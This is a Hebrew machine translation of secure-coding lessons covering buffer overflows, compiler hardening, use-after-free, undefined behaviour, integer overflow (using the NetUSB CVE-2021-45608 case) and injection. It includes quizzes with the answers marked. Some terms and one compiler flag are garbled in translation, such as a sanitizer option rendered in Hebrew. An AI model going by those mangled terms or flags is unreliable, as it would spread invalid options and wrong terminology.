אם אתה משתמש ב- C, קיימות תבניות רבות שסביר במיוחד שיהיו פגיעות, כולל שימוש בפונקציות כגון **strcpy() להעתקת מחרוזת, **strcat() כדי ** לשרשר מחרוזת ** ולולאות שמוסיפות בהדרגה למאגר. בשלב מוקדם בפיתוח של C, נוצרו פונקציות שהגבילו את המקומות שבהם ייכתבו נתונים, במיוחד **strncpy**()  **ו-strncat()**. עם זאת, השימוש ב-strncpy() ** **וב-strncat()** דורש חישוב מחדש מתמיד של השטח **שנותר**, מה שמקשה על השימוש בהם בצורה נכונה (קל מאוד לקבל שגיאת "כבוי על ידי אחד" בקוד זה שרק התוקפים מבחינים בה). הפונקציה **strncpy()** גם מחליפה את כל השטח שנותר, מה שהופך אותה לבלתי יעילה באופן אבסורדי ברוב הנסיבות.

אם אתה משתמש ב- C, לפעמים באפשרותך להשתמש בפונקציות בטוחות יותר במקום זאת. הפונקציה C **snprintf()** כותבת פלט למאגר מחרוזות בהינתן תבנית, והיא לא תחליף מעבר לאורך נתון. הפונקציה **memccpy()** מאפשרת לך לעשות עותק פשוט, שוב מבלי לעבור את האורך המרבי. עם זאת, בכל המקרים האלה אתה לא יכול פשוט לקרוא את הפונקציה - ברוב המקרים, אתה גם צריך לבדוק את ערך ההחזרה שלה כדי לראות אם היתה הצפה, ואם היה, לעשות משהו הגיוני (וזה בדרך כלל להפסיק לעבד את הקלט). הפונקציות  asprintf() ** ו- **vasprintf()**** מאפשרות לך להקצות מחדש מחרוזת חדשה, שבה באפשרותך להשתמש כדי לשנות את גודל המחרוזת. כמו תמיד, עליך לוודא שאתה משחרר את כל המחרוזות שהוקצו בעבר ברגע שהן כבר לא בשימוש, ולוודא שאתה משחרר אותן רק פעם אחת (בעיה שנדון בה בקרוב). אם אתה לא מוכן לעשות את זה בזהירות ובשיטתיות, אתה כנראה לא צריך להשתמש ב- C.

מהדרים מודרניים עבור שפות אלה, ומערכות ההפעלה התומכות בהן, משתמשים במגוון טכניקות הקשחה כדי להפוך את ניצול ההתקפות הללו לקשה יותר. אמצעי הקשחה נרחבים כוללים:

* אקראיות פריסת שטח כתובות (ASLR)<br>אקראיזציה של המקום שבו אובייקטים מאוחסנים בזיכרון, מה שמקשה על התוקפים להתמקד באובייקטים מסוימים (במהדרים gcc ו- clang ייתכן שיהיה עליך להפעיל מצב PIE, למשל, באמצעות -**fPIE)**

* זיכרון שאינו ניתן להפעלה<br>ודא שלא ניתן לכתוב זיכרון עם הוראות הפעלה בו-זמנית, מה שמקשה מעט על התוקפים לשנות תוכנה או להציג קוד זדוני משלהם.

* Canaries<br>הכנס בדיקה נוספת בפונקציות נבחרות; לפני שהם חוזרים, הם מבצעים בדיקת שפיות על ערך שנקרא "שומר" או "קנרית" שמזהה סוגים מסוימים של הצפות מאגר שמבצעות כתיבה (מהדרים GCC ו- clang יכולים לעשות זאת עם אפשרויות כמו  -**fstack-protector**)

* מוסיף גבולות אוטומטיים<br>שנה קוד במהלך ההידור כדי לבצע בדיקת גבולות גם אם לא התבקש במקור (מהדרים gcc ו- clang יכולים לעשות זאת עם האפשרות - **D_FORTIFY_SOURCE=2**).

אם אתה כותב קוד שאינו בטוח לזיכרון, או קוד קריאה שאינו בטוח לזיכרון, ודא שאמצעי הקשחה כגון אלה מופעלים בכל עת שתוכל, כולל בהידור, בבדיקה ובהפקה. החדשות הטובות הן שהקשחת צעדים כאלה תאט חלק מהניצולים. אבל בסופו של דבר, צעדי הקשחה לעתים קרובות אינם *מונעים* ניצול. במקרה הטוב, הצעדים המתקשיחים הללו הופכים את "השתלטות על התוכנית" ל"תוכנית מפסיקה לעבוד"... וזה  המקרה *הטוב ביותר*. הדרך היחידה לא לקבל קוד פגיע... היא לא שיהיה קוד פגיע.

#### חידון 2.4: התמודדות עם קריאות וכתיבה מחוץ לתחום (גלישת מאגר)

\>\>תוכניות הנכתבות בשפות שאינן בטוחות לזיכרון, כגון C ו- C++ , חייבות להיזהר *לעולם* לא  לאפשר למשתמש לא מהימן לגרום לקריאה או כתיבה מחוץ לתחום. זה יכול להיות מאתגר לעשות זאת ללא יוצא מן הכלל; יישום נכון של פונקציות כמו **snprintf()** יכול לעזור. אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

נכון. כמובן, זה בטוח יותר לא להשתמש בשפות זיכרון לא בטוח מלכתחילה, אבל זה לא תמיד אופציה היום.

[הסבר]

### ללא שימוש כפול, ללא שימוש ושחרור חסר

[קוד לא בטוח לזיכרון]

קריאות וכתיבה מחוץ לטווח אינן הבעיה היחידה עבור תוכניות שנכתבו בשפות כגון C או C++ .

בעת עיבוד מידע אתה בדרך כלל צריך להקצות זיכרון (למשל, עם **חדש**) ולהשתמש בו לזמן מה. רוב שפות התכנות עוקבות באופן אוטומטי כאשר אינך צריך להשתמש יותר בזיכרון ולדרוש אותו בחזרה; תהליך זה נקרא *איסוף אשפה אוטומטי * או *ניהול זיכרון אוטומטי* (נשתמש במונח האחרון). ישנן דרכים שונות לבצע ניהול זיכרון אוטומטי (האופייניים ביותר הם ספירת הפניות או מעקב), והטרמינולוגיה משתנה, אך הנקודה היא שברוב שפות התכנות זה מטופל עבורך באופן אוטומטי.

אבל בשפות תכנות מסוימות אתה חייב  לשחרר זיכרון *באופן ידני* כאשר אתה מסיים עם זה. בפרט, זה נכון עבור C (**חינם**) ו- C++ (**מחיקה**). אם אתה שוכח לשחרר את הזיכרון כאשר אתה מסיים להשתמש בו, זה מוביל "דליפת זיכרון"; התוכנית תשתמש יותר ויותר בזיכרון. במצבים מסוימים השימוש הגובר בזיכרון עלול להוביל לביצועים ירודים יותר ויותר או לקריסה, שהיא אובדן זמינות.

לעתים קרובות נושא האבטחה החשוב יותר הוא שחרור ידני של אזור הזיכרון *יותר* מפעם אחת; זה נקרא *חופשי כפול*. בעיית אבטחה גדולה נוספת היא * שימוש ללא תשלום*, כלומר, שימוש בזיכרון לאחר שהוא שוחרר. בשפות בטוחות לזיכרון, פעולה ללא תשלום כפול או ללא שימוש לאחר מכן לא תתרחש. עם זאת, תוכנית ללא כפל או ללא שימוש בתוכנית C או C++ לעתים קרובות משחיתה תשתית ברמה נמוכה ויכולה לשנות את הערך של ערכי תוכנית שנראים כלא ** קשורים.

אם תוקף יכול לגרום לתוכנית שלך להיות חופשית פעמיים או ללא שימוש לאחר מכן, הדבר עלול לגרום לפגיעות חמורה שבה התוקף יכול לגרום לתוכנית לעשות כל דבר. הסיבה לכך היא שטעויות אלה מאפשרות לעתים קרובות לתוקף להשחית ולשלוט בתשתית שעליה פועלת התוכנית שלך.

הפתרון המתבקש הוא להשתמש רק בשפות תכנות שבהן אינך צריך לשחרר זיכרון באופן ידני. רוב שפות התכנות מטפלות בניהול זיכרון באופן אוטומטי.

במקרים שבהם זה לא מעשי, פשט את הקוד שלך כמיטב יכולתך, כך שיהיה ברור היכן יתרחש deallocation, כך שהוא יתרחש בדיוק פעם אחת ולעולם לא תשתמש בו שוב. שקול להגדיר מצביעים ל- NULL (0) לאחר שתסיים עם מה שהם מצביעים עליו. פעולה זו תפחית את הסיכון לשחרר אותם או להשתמש בהם שוב מאוחר יותר, ואם אין צורך רבות מהמשימות הללו יעברו אופטימיזציה על ידי המהדר.

 שימוש לאחר ללא תשלום הוא גורם נפוץ כל כך של פגיעויות אבטחה כי זה 2021 CWE Top 25 #7 ו 2019 CWE Top 25 #7. זה [CWE-416](https://cwe.mitre.org/data/definitions/416.html) (*השתמש לאחר חינם*). ללא כפל הוא הגורם הנפוץ כל כך לפגיעויות אבטחה שהוא 2019 CWE Top 25 #31. זה [CWE-415](https://cwe.mitre.org/data/definitions/415.html) (*כפול חינם*).  כישלון לשחרר זיכרון ברגע שהוא כבר לא נחוץ הוא 2021 CWE Top 25 #32; זהו [CWE-401](https://cwe.mitre.org/data/definitions/401.html) (שחרור חסר של זיכרון לאחר חיים אפקטיביים).

#### חידון 2.5: ללא תשלום כפול, ללא שימוש ושחרור חסר

\>\>ב- C וב- C++ אין זה משנה אם אתה משתמש באזור זיכרון לאחר שחרורו, כל עוד אתה משתמש באזור הזיכרון באותה פונקציה או שיטה. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

לא, זה לא בטוח להשתמש באזור זיכרון לאחר שחרורו ממנו, לא משנה מה. זה *עשוי* להסתדר בזמן מסוים, ולא בזמן אחר.

[הסבר]

### הימנע מהתנהגות לא מוגדרת

[קוד לא בטוח לזיכרון]

שפות תכנות רבות מוגדרות במפרט פורמלי כלשהו. כאשר זה המקרה, כאשר מעשי, עליך לנסות לכתוב קוד התואם למפרטים אלה, מכיוון שסביר יותר שהקוד שלך יעבוד בכל המקרים, וככל שמימושי השפה משתנים, סביר יותר שהקוד שלך ימשיך לעבוד.

לפעמים מפרטים אלה יאפשרו אחת מכמה אפשרויות שונות (זה נקרא לפעמים "התנהגות לא מוגדרת" או "התנהגות ספציפית למהדר"). בדרך כלל עליך לנסות לכתוב את הקוד שלך כך שלא משנה באיזו אפשרות מותרת משתמשים, זה פשוט ימשיך לעבוד. שפות התומכות בשרשור מאפשרות לביצוע הליכי משנה במקביל ובסדר שרירותי. בשפות רבות, סדר הפעולות בקריאה כגון **f(aa, bb**, cc) אינו  מוגדר (כלומר, הוא אינו מבטיח כי **aa** או **cc** מחושב ראשון). היזהר בהתאם למה שהכלים שלך עושים כרגע, מכיוון שכאשר הכלים משודרגים מה שהם עושים עשוי להשתנות. עבור מפתחים רבים, התמודדות עם זה היא כבר טבע שני.

עם זאת, לשפות מסוימות (כגון C ו- C++ ) יש מבנים עם *התנהגות בלתי מוגדרת* באמת. כלומר, אם אתה נוקט בפעולות מסוימות, המפרט מבטיח *שום דבר*. לדוגמה, C [FAQ](http://c-faq.com/ansi/undef.html) מציין כי עם התנהגות לא מוגדרת, *"כל דבר בכלל יכול לקרות; התקן אינו מטיל דרישות. ייתכן שהתוכנה לא תצליח לבצע הידור, או שהיא תפעל באופן שגוי (או שקרסה או תניב תוצאות שגויות בשקט), או שהיא עלולה לעשות בדיוק את מה שהמתכנת התכוון".*

כל התנהגות לא מוגדרת יכולה להיות - ולעתים קרובות היא - פגיעות אבטחה. גם אם במקרה זו לא הייתה פגיעות אבטחה כיום, שדרוג מינורי בכלים, במערכת ההפעלה או בתצורה שלך עלול להפוך אותה לפגיעות.

לשפות רבות יש לפחות כמה התנהגויות לא מוגדרות, ולכן, אם אתה משתמש בשפות אלה, עליך ללמוד מהן ולהימנע מהן. ל- C ול- C++ יש מספר גדול במיוחד של התנהגויות לא מוגדרות. לדוגמה, עבור C, יש מאות התנהגויות לא מוגדרות; הרשימה היא באורך של 11 עמודים בטיוטה הסופית של [C18 נספח J.2.](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf) כמו כן, קל מאוד ב- C וב- C++ לכתוב בטעות קוד בעל התנהגות לא מוגדרת.  כבר ראינו כמה דוגמאות להתנהגות לא מוגדרת: קריאה וכתיבה מחוץ לגבולות המאגר, שימוש לאחר מכן, וחופשי כפול. הנה עוד כמה.

ב- C וב- C++ , גם הפחתה של מצביע Null אינה מוגדרת (לדוגמה, הערכת "**&#42;p**" כאשר **p** הוא **NULL).** משמעות הדבר היא שניסיון לנטרל מצביע Null אינו מוביל בהכרח לניסיון לקרוא ערך לא חוקי, התוכנית עשויה לעשות *משהו* בכלל.

 *הפניית מצביע Null* ([CWE-476](https://cwe.mitre.org/data/definitions/476.html)) היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #15 ו- 2019 CWE Top 25 #14.

ב- C וב- C++ , גלישת מספר שלם חתום אינה מוגדרת (לדוגמה, **int** עם  ערך **MAX_INT** עם 1 נוסף אליו). אין ערובה לכך שמספרים שלמים חתומים עוטפים; במקום זאת, התוכנית עשויה לעשות משהו בכלל.

 גלישה או מעטפת של מספרים שלמים היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #12 ו- 2019 CWE Top 25 #8. זהו [CWE-190](https://cwe.mitre.org/data/definitions/190.html), גלישת מספרים שלמים או מעטפת* (אם כי CWE זה מכסה גם עטיפה לא חתומה, המוגדרת ב- C וב- C++ ).* 

אולי עד עכשיו ברור מדוע אנשים רבים ממליצים להימנע מ- C ו- C++ אם הקוד צריך להיות מאובטח. ממגוון סיבות, קשה יותר לכתוב תוכנה מאובטחת בשפות אלה! אבל שוב, יש *סיבות* שאנשים בוחרים בשפות האלה,  וכמובן, אם משהו כבר כתוב בשפות האלה, קשה לשנות.

לכן, אם אתה משתמש ב- C וב- C++ , יש דרכים שבהן תוכל להפחית את הסיכונים שלך. כבר דנו בכמה אפשרויות. הנה עוד כמה:

* קרא את הסטנדרטים שלה בעיון, כך שתדע את כל ההתנהגויות הנפוצות הלא מוגדרות והימנע מהן באופן פעיל בעת כתיבת קוד.

* הפעל אזהרות לגבי התנהגויות לא מוגדרות. דוגמאות לדגלים כאלה של gcc ו/או clang כוללות ** -fsanitize=חתימה-גלישה** (הזהר מפני גלישה חתומה), -ftrapv (**מלכודות חתומות על הצפת מספרים שלמים), ** -fsanitize=address, -fsanitize=**  undefined**, ו**--fcatch-undefined-behavior** (אבל זה לא תמיד יזהה אותם!)****

* כפה על המהדר להקצות משמעות להתנהגויות לא מוגדרות באופן רשמי. אתה לא צריך להסתמך על אלה, אבל הם יפחיתו את ההשפעה של ביצוע טעות. דוגמאות לדגלי gcc ו/או clang כאלה כוללות  -fwrapv ** (גלישת מספרים שלמים על גלישה), ** -fno-delete-null-pointer-checks, ו**--fno-strict-overflow**.****

בהמשך נדון בשימוש בכלים כדי לנסות לזהות אותם, אך ראו הוזהרתם: רוב הכלים במקרה הטוב מזהים *כמה* התנהגויות לא מוגדרות, לא את כולן. ההגנה הטובה ביותר שלך היא להשתמש בשפה ללא התנהגויות לא מוגדרות או מעטות. כאשר זה לא סביר, לדעת בדיוק מה לא מוגדר, ולכתוב בזהירות קוד כך שזה לא תלוי התנהגויות לא מוגדרות.

#### חידון 2.6: הימנע מהתנהגות לא מוגדרת

\>\>ב- C וב- C++ , הפניית מצביע Null אינה בעיית אבטחה רצינית, מכיוון שאתה פשוט תקרא ערך נתונים או, במקרה הרע, תקרוס את התוכנית. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

לא, ב- C וב- C++ האטרמציה של מצביע Null היא התנהגות לא מוגדרת. כל התנהגות לא מוגדרת עלולה לגרום לכל דבר רע לקרות, כולל מחיקת כל הקבצים, הצגת כל המפתחות הסודיים או כל דבר אחר. סביר יותר שהיא תגרום לבעיה עדינה, אך בעיה עדינה זו עלולה גם להוות נקודת תורפה חמורה באבטחה.

[הסבר]

## עיבוד נתונים בצורה מאובטחת: חישוב נכון

### הימנע מגלישה של מספרים שלמים, עטיפה וזרימה תחתונה

מקובל לחשב מספרים שלמים בתוכניות, למשל על ידי הגדלה רציפה (הוספה של 1 ל) משתנה. עם זאת, אף מחשב לא באמת יכול להתמודד עם מספר אינסופי של ספרות. למעשה, שפות תכנות רבות משתמשות במספר קבוע של סיביות בסוגי המספרים השלמים הנפוצים ביותר שלהן, כך שלמספרים השלמים המינימליים והמקסימליים יש טווח קטן בהרבה ממה שניתן לייצג על ידי המחשב.

אם תוקף יכול לגרום לחישוב מספר שלם לחרוג מטווח הייצוג של המספר השלם, התוצאה עלולה להיות פגיעות. מכיוון שחישובי מספרים שלמים הם נפוצים, ומפתחים שוכחים לעתים קרובות שמחשבים לא באמת יכולים להתמודד עם מספר אינסופי של ספרות, זוהי פגיעות נפוצה יחסית.

כפי שכבר ציינו, ב- C וב- C++ , עליך לכתוב את התוכנית שלך כך שתוקף לא יוכל לגרום לסוגי המספרים השלמים החתומים הרגילים (כגון int) לעלות על גדותיהם או לזרימה תחתונה. גלישה או זרימה תחתונה של מספר שלם חתום היא בדרך כלל התנהגות לא מוגדרת ב- C וב- C++ , והתוכנית רשאית לעשות כל דבר כאשר היא מתרחשת (כולל הפעלת פגיעות).

ב- C וב- C++ , עולה על גדותיו או מתחתיו מספר שלם לא חתום עוטף את הייצוג הבסיסי שלו (בדרך כלל משלים של שניים). לכן ב- C וב- C++ זה אופייני שהוספת 1 לערך הלא חתום הגדול ביותר הניתן לייצוג תפיק 0. בשפות תכנות רבות אחרות, גם מספרים שלמים חתומים וגם מספרים שלמים לא חתומים מאוחסנים באורך קבוע ועוטפים את הגלישה והזרימה התחתונה (בדרך כלל בהשלמה של שניים). זה לא תמיד דבר טוב; אם תוקף יכול לגרום לזרימה תחתונה או לגלישה, ואם התוכנית לא תוכננה לטפל בכך, התוצאה עלולה לעתים קרובות להיות פגיעות.

שפות תכנות מסוימות עוברות באופן אוטומטי לתבניות של מספרים שלמים "מספר גדול" לפי הצורך כדי לתמוך במספר שרירותי של ספרות, במקום להשתמש במספר קבוע של סיביות כדי לייצג מספר שלם. שפות תכנות אלה כוללות את Python, Ruby ו-Scheme. שפות תכנות רבות אחרות מספקות תמיכה בתבניות כאלה, כגון באמצעות ספרייה, אם כי ייתכן שיהיה עליך לבקש באופן ספציפי להשתמש בתבנית זו (למשל, כסוג). פורמטים אלה לא באמת יכולים לתמוך במספר אינסופי של ספרות, שכן לאף מחשב אין זיכרון אינסופי, אבל זה מקטין מאוד את הסיכון לבעיות כאלה. במקרים רבים מועלה חריג אם החישוב אוזל מהשטח, לכן ודא שהתוכנית יכולה לטפל כראוי בחריג זה. בעיה נפוצה היא שלעתים קרובות תוכניות צריכות לקרוא לשגרה שנכתבה בשפת תכנות אחרת, ובמהלך המרה זו ניתן להמיר את המספר לפורמט ברוחב קבוע שאינו יכול לאחסן את הערך (ובכך ליצור מחדש את הבעיה).

שפת התכנות JavaScript היא מקרה יוצא דופן. מפרט JavaScript, הנקרא ECMAScript, אינו מספק תמיכה ישירה עבור מספרים שלמים. במקום זאת, מספרים שלמים מיוצגים בדרך כלל באמצעות מספרי נקודה צפה. כפי שצוין במפרט השפה ECMAScript (סעיף "סוג המספר"), משמעות הדבר היא כי סוג המספר של JavaScript יכול לייצג במדויק את כל המספרים השלמים המתמטיים החיוביים והשליליים שגודלם אינו עולה על 2<sup>53</sup>. עם זאת, אם תוקף יכול לגרום למספרים שלמים מחושבים לחרוג מטווח זה, דברים מוזרים יכולים לקרות. לדוגמה, הגדלת מספר שלם חיובי מעבר לערך זה עשויה להפיק תוצאה ללא שינוי, מכיוון שהסוג המשמש כבסיס אינו יכול לאחסן כל ספרה. ישנם גם כמה אופרטורים העוסקים רק במספרים שלמים בטווחים ספציפיים (כגון -2 31 עד 2 <sup>31-1</sup> כולל<sup>, או 0 עד 2 16-1 כולל</sup><sup></sup>); ודא שתוקף אינו יכול לגרום לחריגה מטווחים אלה לפני שתתקשר למפעילים אלה. לקבלת מידע נוסף, עיין במפרט [השפה של ECMAScript ® 2021](https://www.ecma-international.org/publications-and-standards/standards/ecma-262/) מ- ECMA.

אחת הדרכים הפשוטות ביותר להבטיח שתוקף לא יוכל להפעיל פגיעויות כתוצאה מהצפה ותת-זרימות של מספרים שלמים היא לבצע אימות קלט בכל המספרים הלא מהימנים. בכל בדיקות אימות הקלט הללו, אכוף ערכי מינימום ומקסימום על כל המספרים השלמים הלא מהימנים, כך שהקלטים המקובלים לא יוכלו להוביל לחישוב שיגרום לגלישה או לזרימה של מספר שלם. אם זה נעשה, אז לא יכולות להיות נקודות תורפה כאלה. אם לא ניתן לעשות זאת, התוכנית צריכה לזהות הצפות וזרימות תחתיות של מספרים שלמים שיכולים להיות מופעלים על ידי תוקף, לפני או אחרי החישוב, ולטפל בהם כראוי.

>  שעת סיפור: NetUSB CVE-2021-45608

> דוגמה לגלישה של מספר שלם המובילה לפגיעות היא  CVE-2021-45608[, כפי שמוסבר בסעיף "](https://nvd.nist.gov/vuln/detail/CVE-2021-45608)CVE-2021-45608[ | פגם NetUSB RCE במיליוני נתבים של משתמשי קצה](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/)" מאת מעבדות סנטינל.  מודול הליבה KCodes NetUSB, המשמש מספר רב של ספקי התקני רשת, היה בעל פגיעות של גלישת מספרים שלמים. המודול לקח אורך לא מהימן שסופק על ידי הלקוח, הוסיף 0x11 והקצה כמות זו של זיכרון. אם האורך המבוקש היה גדול (למשל, כל ה-1 שניות בינאריות), התוספת הייתה עוטפת וגורמת להקצאה קטנה מדי. לאחר מכן, הנתונים יושלכו לתוך המאגר הקטן מדי, מה שיוביל להצפת מאגר.
>
> זה מראה שחשוב לבדוק אם יש מעטפת בעת שימוש בנתונים הנשלטים על-ידי התוקף, במיוחד אם אתה משתמש בהם כדי לקבל החלטות לגבי גודל או מחוץ לטווח. ניתן ללמוד גם כללים אחרים. ראשית, תמיד לאמת נתונים ממקור לא מהימן (למשל, נתונים מהאינטרנט) - לא הייתה שום סיבה לאפשר כל בקשת הקצאה כל כך גדולה. שנית, מודול זה האזין לבקשות מרשת התקשורת הרחבה (WAN) במקום רק מרשת התקשורת המקומית (LAN); התוכנה צריכה למזער את ההרשאות רק למה שנדרש כדי להפחית את הסבירות או ההשפעה של נזק אם יש פגיעות.


  גלישה או מעטפת של מספרים שלמים היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #12 ו- 2019 CWE Top 25 #8. זה [CWE-190](https://cwe.mitre.org/data/definitions/190.html), *גלישה של מספר שלם או עטיפה*.

#### חידון 2.7: הימנע מגלישה של מספרים שלמים, עטיפה וזרימה תחתונה

>>ניתן להתעלם מגלישת מספרים שלמים בעת טיפול בנתונים לא מהימנים. אמת או שקר?<<

( ) נכון
(x) לא נכון

[הסבר]לא. טווח הערכים האפשריים משתנה בהתאם לשפה ולסוגים שבהם נעשה שימוש, אך התוקפים יכולים לעתים לנצל הצפות של מספרים שלמים.[הסבר]


# התקשרות לתוכניות אחרות

פרק זה מתאר כיצד להתקשר לתוכניות אחרות בצורה מאובטחת, כולל כיצד להתמודד עם התקפות הזרקה (כולל הזרקת SQL והזרקת פקודות מערכת הפעלה) וכיצד לטפל כראוי בשמות קבצים/שמות נתיבים.

מטרות הלמידה:

1. דונו ביסודות של התקשרות מאובטחת לתוכניות אחרות.

2. להבין כיצד להתמודד עם התקפות הזרקה (כולל הזרקת SQL והזרקת פקודות מערכת ההפעלה).

3. דונו בטיפול נכון בשמות קבצים/שמות נתיבים.

## מבוא לתוכניות שיחות מאובטחות

### מבוא לתוכניות שיחות מאובטחות - היסודות

מעט מאוד תוכניות הן עצמאיות לחלוטין; כמעט כל התוכניות קוראות לתוכניות אחרות. זה כולל תוכניות מקומיות, כגון תוכניות המסופקות על-ידי מערכת ההפעלה, ספריות תוכנה מוכללות עבור שפה זו ותוכנות ממאגרי חבילות (כגון npm, PyPI ו- maven). מערכות מודרניות קוראות לעתים קרובות דרך רשת לשירותים אחרים, מבצעות בקשות באמצעות ממשקי API שונים (כגון ממשקי API של REST ו- GraphQL) ומקבלות נתונים בפורמטים כגון JSON ו- XML. כמעט כל התוכניות האלה מתקשרות לתוכניות אחרות. לעתים קרובות, שיחות עקיפות אלה אינן ברורות מאליהן (למשל, קריאה לספרייה שנכתבה על ידי מישהו אחר) או כרוכות בתשתית "נסתרת" רבה.

עליך להיות זהיר לגבי התוכניות שבהן תבחר להשתמש (לתת אמון) ולנהל אותן (לדוגמה, כיצד אתה מקליט ומעדכן אותן). לאחר שתבחר בהן, עליך להיות זהיר לגבי אופן השימוש בתוכניות אחרות אלה. בסעיף זה, אנחנו הולכים לדבר על *שימוש מאובטח * בתוכניות אחרות.

ראשית, המובן מאליו: אם ידוע שתוכנה מסוימת אינה מאובטחת, והאבטחה חשובה, אל תשתמשו בה! אבל בדרך כלל, אתה לא משתמש בתוכנית ידועה-לא בטוחה, אז בואו להתקדם מעבר לזה.

אם יש דרך קלה יחסית להגביל את ההרשאות של השגרה שאתה מתקשר אליה, עשה זאת. אם אתה יכול *להגביל* את ההרשאות שניתנו, אזי, אם תוקף פורץ דרך, הנזק מוגבל יותר וזה עלול להקשות על התוקף לגרום נזק רב יותר. זוהי דוגמה נוספת לעקרון הביטחון של הזכות הפחותה. לדוגמה, אם אתה מתקשר למסד נתונים, נסה להגביל את הרשאות מסד הנתונים של התוכנית המבצעת את הבקשה. אם אתה משתמש ב- SQL, שקול להשתמש בפקודה **GRANT** כדי שלתוכנית המבקשת יהיו פחות הרשאות.

עיקרון שימושי הוא רק לקרוא לשגרה עם ערכים חוקיים. אם שגרה דורשת שהמספר יהיה 0 עד 9, אז זה לא צריך להיות אפשרי עבור תוקף לגרום 50 להישלח. זה קל יותר בתיאוריה מאשר בפועל, במיוחד מאז גבולות אלה לא תמיד מתועדים היטב. אבל כאשר אתה יודע על מגבלה, שקול לבצע כמה בדיקות כדי לוודא שהן מכובדות, או כתוב את התוכנית שלך כך שהמגבלות יכובדו בהכרח.

עיקרון חשוב מאוד הוא שאם קשה להשתמש בשגרה בצורה מאובטחת, ויש דרך אחרת לבצע את המשימה שקל יותר לבצע בצורה מאובטחת, השתמש בשגרה שקל יותר להשתמש *בה בצורה מאובטחת*. הנה כמה סימני אזהרה לכך שאתה משתמש בשגרה שקשה להשתמש בה באופן מאובטח:

* הוא מבצע כל תוכנית שנשלחת אליו, וחלק מהנתונים שאתה שולח עשויים להגיע מתוקף. לכל שגרה עם שם כמו **eval(), **exec**(), execute()**, או **system()** **** יש סיכוי גבוה להיות בקטגוריה זו. לדוגמה, אל תשתמש ב**- eval**()  ב- JavaScript כדי לעבד נתוני JSON (באופן כללי!); להשתמש במשהו בטוח יותר כמו הפונקציה JSON.parse(**).**

* הוא דורש ממך לשרשר מחרוזות קבועות עם נתונים שעשויים להגיע מהתוקף. באופן כללי, יש לברוח מנתונים אחרים מהתקפה, וקל לטעות כאשר בורחים מנתונים.

* תבנית הקלט שלו מתוארת באמצעות מפרט שפה (כגון טופס Backus-Naur).

* הוא נועד לאינטראקציה אנושית ישירה, לא לתוכנית שתפעיל אותו.

  אתה *יכול* להשתמש בשגרה כזו בצורה מאובטחת, ולפעמים אתה צריך. אבל אם אתה יכול להימנע מכך, התוכנית שלך כנראה תהיה מאובטחת יותר - וכנראה שיהיה קל יותר לתחזק אותה. אם אינך יכול להימנע מהם, ייתכן שתרצה לעטוף את השימוש בהם בעטיפות מיוחדות כדי להקל על השימוש בהם בבטחה.

מדוע קשה להשתמש בסוגים מסוימים של שגרות בצורה מאובטחת? אחת הבעיות הנפוצות היא שרוטינות רבות מקבלות שפות עם *מטא-תווים -* כלומר, תווים שמשנים את האופן שבו תווים אחרים מתפרשים במקום להיות נתונים בעצמם. לדוגמה, תו המרכאות הכפולות (**"**) הוא לעתים קרובות מטא-תו (כולל ב- SQL וב- shell). אם יש מפרט שפה, זה כמעט בוודאות אומר שיש מטא-דמויות. תמיכה במטא-תווים היא גמישה מאוד, ואם כל הקלט מהימן, זו לא בעיה. אבל כאשר חלקים מהנתונים עשויים להיות מתוקף, עליך להיות זהיר מאוד ולנקוט אמצעי זהירות נוספים. אם תוקף יכול להכניס מטא-תווים לתוך הקלט, והם לא נמלטים בדיוק כראוי, אז פגיעויות מסוכנות ומנוצלות בקלות לעתים קרובות לבוא אם הם נקראים על ידי איזה מתורגמן. התקפות מסוג זה נקראות לעיתים התקפות הזרקה.

 פגיעויות להתקפות הזרקה הן טעויות נפוצות כל כך ביישומי אינטרנט ש"הזרקה "היא  2017 OWASP Top 10 #1 ו-2021 OWASP Top 10 #3. 2021 CWE Top 25 #28 ו-2019 CWE Top 25 #18 מזוהים CWE-94, שליטה לא נכונה ביצירת קוד ('הזרקת קוד'[). 2021 CWE Top 10 #25 הוא ](https://cwe.mitre.org/data/definitions/94.html)CWE-77*, *נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודה ('הזרקת פיקוד')[](https://cwe.mitre.org/data/definitions/77.html) ** . גם CWE-94 וגם CWE-77 הם מקרים מיוחדים של CWE-74[](https://cwe.mitre.org/data/definitions/74.html). * נטרול לא תקין של אלמנטים מיוחדים בפלט המשמש רכיב במורד הזרם ('הזרקה')*. לקטגוריה הכללית CWE-74 יש מקרים מיוחדים נפוצים אחרים כגון פגיעויות הזרקת SQL (CWE-89) [והזרקת פקודות מערכת הפעלה (](https://cwe.mitre.org/data/definitions/89.html)CWE-78[) שנדון בהם בקרוב.](https://cwe.mitre.org/data/definitions/78.html)

אז אתה צריך להבטיח שכאשר אתה שולח נתונים לתוכנית כלשהי (או פלט), אתה שולח אותם בצורה מאובטחת. זה עשוי לכלול:

* **חיטוי**<br>הסרת כל תו בלתי חוקי או זדוני פוטנציאלי (בדרך כלל מטא-תווים) מהנתונים.

* **בריחה משינוי**<br> תווים (מטא-תווים מסוימים) כך שלא יתפרשו באופן שגוי.

* **נרמול**<br>שינוי צורת הנתונים כך שתהיה טופס נפוץ (וכתופעת לוואי, מניעת גרימת בעיית אבטחה).

במידת האפשר, השתמש בספריות ובממשקי API שעושים זאת עבורך; קל יותר להשתמש בהם בצורה מאובטחת.

